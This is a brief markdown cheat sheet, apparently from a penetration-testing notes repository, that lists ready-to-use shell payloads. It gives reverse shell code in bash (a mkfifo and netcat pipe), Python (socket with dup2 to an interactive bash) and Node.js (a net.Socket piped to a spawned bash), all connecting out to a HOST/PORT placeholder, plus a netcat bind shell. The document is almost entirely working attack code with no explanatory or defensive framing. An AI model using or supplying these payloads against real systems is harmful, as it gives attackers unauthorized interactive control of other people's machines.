# shellwerkz
You may need to use [`nc` with a proxy](./netcat.md).

# Reverse shell

## bash
```bash
mkfifo /tmp/ffifo; /bin/bash -i < /tmp/ffifo 2>&1 | nc $remote_ip $port > /tmp/ffifo
```

## python
```python
import os
import socket
import subprocess

s = socket.socket()
s.connect((HOST, PORT))
 
for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)
 
subprocess.call(["/bin/bash", "-i"])

```

## node
```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/bash", ["-i"]);
    var client = new net.Socket();
    client.connect(PORT, HOST, function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

# Bind shell
## bash
```bash
mkfifo /tmp/f
/bin/sh -i 2>&1 < /tmp/f | nc -lvp $port > /tmp/f
```

